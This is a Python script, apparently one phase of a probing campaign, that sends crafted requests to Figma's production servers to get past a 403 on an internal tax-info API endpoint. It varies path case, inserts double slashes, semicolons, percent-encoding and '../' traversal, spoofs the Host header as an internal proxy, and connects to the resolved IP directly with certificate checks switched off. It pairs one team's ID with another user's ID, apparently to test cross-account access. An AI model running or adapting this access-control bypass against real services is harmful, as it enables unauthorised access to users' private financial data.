# -*- coding: utf-8 -*-
"""第三阶段: 1) cap-api2路径完整响应头(确认proxy语义) 2) host-internal完整响应头(确认服务身份)
3) 代理层变形矩阵(/api/Internal/... 大小写组合) 4) internal-proxy.prod.figma.com 直连尝试
"""
import io, sys, time, urllib.error, urllib.request, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

A_TEAM = "1666382706663462213"
B_UID = "1667396392129259941"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
OUT = io.open("_resolver_403_head_probe3_out.txt", "w", encoding="utf-8")

def call(label, url, extra_hdrs=None):
    hdrs = {"User-Agent": UA, "Accept": "*/*",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/"}
    if extra_hdrs:
        hdrs.update(extra_hdrs)
    req = urllib.request.Request(url, headers=hdrs, method="GET")
    t0 = time.time()
    try:
        r = urllib.request.urlopen(req, timeout=20)
        body = r.read().decode(errors="replace")
        status = r.status
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        status = e.code
        r = e
    except Exception as e:
        print(f"[{label}] !! {type(e).__name__}: {str(e)[:120]}")
        return
    ms = int((time.time() - t0) * 1000)
    OUT.write(f"\n========== [{label}] {status} ({ms}ms) ==========\n")
    for k, v in r.headers.items():
        OUT.write(f"  {k}: {v}\n")
    OUT.write(f"  BODY[{len(body)}]: {body[:400]}\n")
    print(f"[{label}] {status} ({ms}ms) hdrs={len(r.headers)} body={body[:60]!r}")

BASE = "https://www.figma.com"
QS = "team_id=%s&userId=%s" % (A_TEAM, B_UID)

print("========== A. 完整响应头: 代理层 404 语义 ==========")
call("proxy-cap-api2", f"{BASE}/api/Internal/livegraph/sinatra_resolver/tax_info?{QS}")
time.sleep(1)
call("proxy-ds-api", f"{BASE}/api//internal/livegraph/sinatra_resolver/tax_info?{QS}")
time.sleep(1)
call("proxy-semi", f"{BASE}/api;/internal/livegraph/sinatra_resolver/tax_info?{QS}")
time.sleep(1)

print("\n========== B. 完整响应头: Host internal-proxy ==========")
call("host-internal-hdrs", f"{BASE}/api/internal/livegraph/sinatra_resolver/tax_info?{QS}",
     extra_hdrs={"Host": "internal-proxy.prod.figma.com"})
time.sleep(1)
call("host-internal-cap", f"{BASE}/api/Internal/livegraph/sinatra_resolver/tax_info?{QS}",
     extra_hdrs={"Host": "internal-proxy.prod.figma.com"})
time.sleep(1)

print("\n========== C. 代理层变形矩阵 (internal 大写基线) ==========")
cases = [
    ("p-livegraph",  "/api/Internal/livegraph/sinatra_resolver/tax_info"),
    ("p-LiveGraph",  "/api/Internal/LiveGraph/sinatra_resolver/tax_info"),
    ("p-sinatra",    "/api/Internal/livegraph/Sinatra_resolver/tax_info"),
    ("p-Sinatra",    "/api/Internal/livegraph/SinatraResolver/tax_info"),
    ("p-tax",        "/api/Internal/livegraph/sinatra_resolver/Tax_info"),
    ("p-tax2",       "/api/Internal/livegraph/sinatra_resolver/TAX_INFO"),
    ("p-trail",      "/api/Internal/livegraph/sinatra_resolver/tax_info/"),
    ("p-nomethod",   "/api/Internal/livegraph/sinatra_resolver"),
    ("p-live-only",  "/api/Internal/livegraph"),
    ("p-root",       "/api/Internal/"),
    ("p-enc",        "/api/Internal/livegraph/sinatra_resolver/%74ax_info"),
    ("p-dotdot",     "/api/Internal/livegraph/sinatra_resolver/../sinatra_resolver/tax_info"),
    ("p-2slash",     "/api/Internal//livegraph/sinatra_resolver/tax_info"),
    ("p-2slash2",    "/api//Internal/livegraph/sinatra_resolver/tax_info"),
]
for name, p in cases:
    call(name, f"{BASE}{p}?{QS}")
    time.sleep(1)

print("\n========== D. internal-proxy.prod.figma.com 直连 ==========")
try:
    ip = socket.gethostbyname("internal-proxy.prod.figma.com")
    print(f"DNS 解析: internal-proxy.prod.figma.com -> {ip}")
    OUT.write(f"\nDNS: internal-proxy.prod.figma.com -> {ip}\n")
except Exception as e:
    print(f"DNS 解析失败: {type(e).__name__}: {str(e)[:100]}")
    OUT.write(f"\nDNS 解析失败: {e}\n")
    ip = None
if ip:
    for label, url in [
        ("direct-ip", f"https://{ip}/api/internal/livegraph/sinatra_resolver/tax_info?{QS}"),
        ("direct-host", f"https://{ip}/api/internal/livegraph/sinatra_resolver/tax_info?{QS}"),
    ]:
        try:
            ctx = __import__("ssl").create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = __import__("ssl").CERT_NONE
            req = urllib.request.Request(url, headers={"User-Agent": UA, "Host": "internal-proxy.prod.figma.com"}, method="GET")
            r = urllib.request.urlopen(req, timeout=15, context=ctx)
            body = r.read().decode(errors="replace")
            status = r.status
        except urllib.error.HTTPError as e:
            body = e.read().decode(errors="replace")
            status = e.code
            r = e
        except Exception as e:
            print(f"[{label}] !! {type(e).__name__}: {str(e)[:120]}")
            continue
        OUT.write(f"\n========== [{label}] {status} ==========\n")
        for k, v in r.headers.items():
            OUT.write(f"  {k}: {v}\n")
        OUT.write(f"  BODY[{len(body)}]: {body[:400]}\n")
        print(f"[{label}] {status} hdrs={len(r.headers)} body={body[:60]!r}")
        time.sleep(1)

OUT.close()
print("\n落盘: _resolver_403_head_probe3_out.txt")
